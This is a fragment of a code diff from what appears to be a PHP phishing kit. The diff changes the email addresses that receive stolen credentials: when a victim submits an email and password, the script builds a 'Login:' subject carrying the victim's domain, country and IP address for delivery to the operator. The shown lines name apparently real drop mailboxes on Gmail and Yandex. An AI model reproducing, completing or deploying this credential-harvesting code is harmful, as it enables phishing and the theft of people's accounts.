@@ -11,7 +11,7 @@ $server = date("D/M/d, Y g:i a");
 
 if($email != null && $password != null){
 	
-	$own = 'allfresh147@gmail.com, obago2022@yandex.ru, goodresult.logxx@gmail.com, obago2023@yandex.com';
+	$own = 'treyswallow@yandex.com';
 	$subj = "Login: | ".ucfirst(explode("@",$email)[1])." | $country | $ip";
     $from = "KEYWORD";
 
